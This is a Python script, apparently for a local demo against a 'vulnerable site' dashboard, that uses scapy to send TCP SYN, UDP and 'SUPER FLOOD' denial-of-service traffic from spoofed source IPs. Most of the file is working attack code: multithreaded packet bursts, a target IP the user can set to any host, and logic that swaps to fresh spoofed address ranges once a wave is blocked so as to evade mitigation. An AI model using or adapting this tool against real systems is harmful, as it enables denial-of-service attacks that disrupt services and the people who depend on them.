import sys
import time
import random
import threading
import socket
import os
import json
import urllib.request
from scapy.all import IP, TCP, UDP, Raw, send, get_if_list, conf

VULN_SITE_API = "http://127.0.0.1:8080/api/report_traffic"

# Setup Target and Interface
def get_config():
    print("\n[!] Configuration Setup")
    
    try:
        # 1. Select Interface
        interfaces = get_if_list()
        print("\nAvailable Interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  {i}. {iface}")
        
        if_idx_input = input(f"\nSelect interface (0-{len(interfaces)-1}, default 0): ").strip()
        if_idx = int(if_idx_input) if if_idx_input else 0
        selected_iface = interfaces[if_idx]
        
        # 2. Select Target IP
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            # If loopback is chosen, 127.0.0.1 is the only valid target for local visibility
            if "Loopback" in selected_iface:
                local_ip = "127.0.0.1"
        except:
            local_ip = "127.0.0.1"
        
        target_ip_input = input(f"Enter Target IP (default {local_ip}): ").strip()
        target_ip = target_ip_input if (target_ip_input and target_ip_input != '0') else local_ip
        
        print(f"\n[+] Configured: Interface={selected_iface}, Target={target_ip}")
        return selected_iface, target_ip
    except (EOFError, KeyboardInterrupt, Exception):
        print("\nUsing defaults...")
        return get_if_list()[0], "127.0.0.1"

INTERFACE, TARGET_IP = get_config()

# Global flag to control threads
STOP_EVENT = threading.Event()

def send_normal_traffic():
    """Generates various types of normal traffic"""
    print(f"\n[+] Sending Normal Traffic to {TARGET_IP} on {INTERFACE}...")
    print("    (Mimicking HTTP, DNS, and HTTPS requests)")
    print("    (Press Ctrl+C to stop)")
    
    try:
        # For normal traffic, we can use the default send
        while not STOP_EVENT.is_set():
            proto = random.choice(["HTTP", "DNS", "HTTPS"])
            if proto == "HTTP":
                pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="PA")/Raw(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
            elif proto == "DNS":
                pkt = IP(dst=TARGET_IP)/UDP(dport=53)/Raw(b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01")
            else:
                pkt = IP(dst=TARGET_IP)/TCP(dport=443, flags="S")
            
            send(pkt, iface=INTERFACE, verbose=0)
            time.sleep(random.uniform(0.1, 0.5))
    except KeyboardInterrupt:
        pass

# Global stats
TOTAL_SENT = 0
stats_lock = threading.Lock()

# Current active attack wave pool (shared across threads)
current_wave = []
wave_lock = threading.Lock()
wave_number = [0]  # mutable counter

def generate_wave(n):
    """Generate a fresh batch of 50 unique fake IPs for wave N."""
    # Cycle through different /16 ranges so each wave looks like a new botnet
    ranges = [
        (10, random.randint(30,250), random.randint(1,200)),
        (172, random.randint(16,31), random.randint(1,200)),
        (192, 168, random.randint(1,253)),
        (45,  random.randint(1,250), random.randint(1,200)),
        (185, random.randint(1,250), random.randint(1,200)),
        (203, random.randint(1,250), random.randint(1,200)),
    ]
    a, b, c = random.choice(ranges)
    ips = [f"{a}.{b}.{c}.{i}" for i in range(1, 51)]
    print(f"\n[Wave {n}] New botnet spawned: {a}.{b}.{c}.1-50 (50 IPs)")
    return ips

# Start with wave 1
with wave_lock:
    wave_number[0] = 1
    current_wave[:] = generate_wave(1)

def get_blocked_ips():
    try:
        if os.path.exists('blocked_ips.json'):
            with open('blocked_ips.json', 'r') as f:
                return set(json.load(f).keys())
    except:
        pass
    return set()

def flood_worker(attack_type, burst_size):
    """Worker that attacks in endless waves — auto-generates new IP pools when blocked."""
    global TOTAL_SENT
    while not STOP_EVENT.is_set():
        try:
            blocked_ips = get_blocked_ips()
            with wave_lock:
                active_ips = [ip for ip in current_wave if ip not in blocked_ips]

            if not active_ips:
                # This wave is fully blocked — pause so site shows "Mitigated"
                # Only one thread should regenerate; others wait
                if not STOP_EVENT.is_set():
                    with wave_lock:
                        # Re-check inside lock to avoid race
                        still_blocked = [ip for ip in current_wave if ip not in blocked_ips]
                        if not still_blocked:
                            wave_number[0] += 1
                            print(f"\n[!] Wave {wave_number[0]-1} fully mitigated. Recovering 3s before Wave {wave_number[0]}...")
                            push_to_site(0, TOTAL_SENT)  # signal rate=0 so site recovers
                            time.sleep(3)              # brief recovery window
                            new_wave = generate_wave(wave_number[0])
                            current_wave[:] = new_wave
                            print(f"[Wave {wave_number[0]}] Attack resuming with fresh IPs!")
                time.sleep(0.2)
                continue

            spoofed_src = random.choice(active_ips)
            packets = []
            for _ in range(burst_size):
                sport = random.randint(1024, 65535)
                if attack_type in ["SYN_FLOOD", "SUPER_FLOOD"]:
                    pkt = IP(src=spoofed_src, dst=TARGET_IP)/TCP(sport=sport, dport=80, flags="S", window=8192)
                elif attack_type == "UDP_FLOOD":
                    pkt = IP(src=spoofed_src, dst=TARGET_IP)/UDP(sport=sport, dport=random.randint(1, 65535))/Raw(b"X"*64)
                packets.append(pkt)

            send(packets, iface=INTERFACE, verbose=0)

            with stats_lock:
                TOTAL_SENT += len(packets)

            time.sleep(0.01)
        except Exception:
            time.sleep(0.5)
            continue

def push_to_site(rate, total):
    """Push live traffic stats directly to the vulnerable site's API."""
    try:
        blocked_list = list(get_blocked_ips())
        payload = json.dumps({
            "rate": rate,
            "total_packets": total,
            "blocked_ips": blocked_list
        }).encode()
        req = urllib.request.Request(
            VULN_SITE_API, data=payload,
            headers={'Content-Type': 'application/json'}, method='POST'
        )
        urllib.request.urlopen(req, timeout=1)
    except Exception:
        pass  # Site might not be running — silently ignore

def send_ddos_traffic(attack_type):
    """Generates high volume traffic using multi-threading"""
    print(f"\n[!] STARTING {attack_type} ATTACK on {TARGET_IP} using {INTERFACE}...")
    
    # Adjust for stability on Windows
    if attack_type == "SUPER_FLOOD":
        num_threads = 12 
        burst_size = 300
    else:
        num_threads = 4
        burst_size = 50
    
    STOP_EVENT.clear()
    threads = []
    
    for i in range(num_threads):
        t = threading.Thread(target=flood_worker, args=(attack_type, burst_size))
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"    (Launched {num_threads} attack threads with burst size {burst_size})")
    print("    (!!! WARNING: EXTREMELY HIGH TRAFFIC VOLUME !!!)")
    print("    (Press Ctrl+C to stop)")
    
    global TOTAL_SENT
    TOTAL_SENT = 0
    last_report = 0
    
    try:
        while True:
            time.sleep(1)
            with stats_lock:
                current = TOTAL_SENT
            rate = current - last_report
            last_report = current
            # Push live data to the vulnerable website
            push_to_site(rate, current)
            print(f"\r[>] Packets sent: {current:,} | Rate: {rate:,}/s", end="")
    except KeyboardInterrupt:
        STOP_EVENT.set()
        print(f"\n\n[-] Stopping {attack_type} attack...")
        # Signal the website that attack has stopped
        push_to_site(0, TOTAL_SENT)
        for t in threads:
            t.join(timeout=1)

def main():
    global INTERFACE, TARGET_IP
    while True:
        print("\n" + "="*42)
        print("    ENHANCED DDoS TRAFFIC GENERATOR    ")
        print("="*42)
        print(f"Target: {TARGET_IP} | Interface: {INTERFACE}")
        print("1. Normal Traffic Mix")
        print("2. TCP SYN Flood")
        print("3. UDP Flood")
        print("4. SUPER FLOOD (Massive)")
        print("5. Reconfigure Target/Interface")
        print("6. Exit")
        print("="*42)

        try:
            choice = input("\nSelect Option (1-6): ").strip()
            if not choice: continue
            
            if choice == '1':
                send_normal_traffic()
            elif choice == '2':
                send_ddos_traffic("SYN_FLOOD")
            elif choice == '3':
                send_ddos_traffic("UDP_FLOOD")
            elif choice == '4':
                send_ddos_traffic("SUPER_FLOOD")
            elif choice == '5':
                INTERFACE, TARGET_IP = get_config()
            elif choice == '6':
                sys.exit(0)
            else:
                print("Invalid choice.")
        except (KeyboardInterrupt, EOFError):
            print("\nExiting.")
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
